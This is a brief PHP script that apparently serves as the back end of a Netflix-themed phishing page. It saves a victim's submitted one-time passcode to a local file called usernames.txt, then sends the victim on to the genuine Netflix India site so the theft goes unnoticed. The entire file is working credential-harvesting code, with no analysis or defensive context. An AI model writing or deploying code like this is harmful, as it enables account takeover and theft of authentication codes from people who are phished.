<?php
file_put_contents("usernames.txt", "OTP: " . $_POST['OTP'] . "\n", FILE_APPEND);
header('Location: https://www.netflix.com/in');
exit();
?>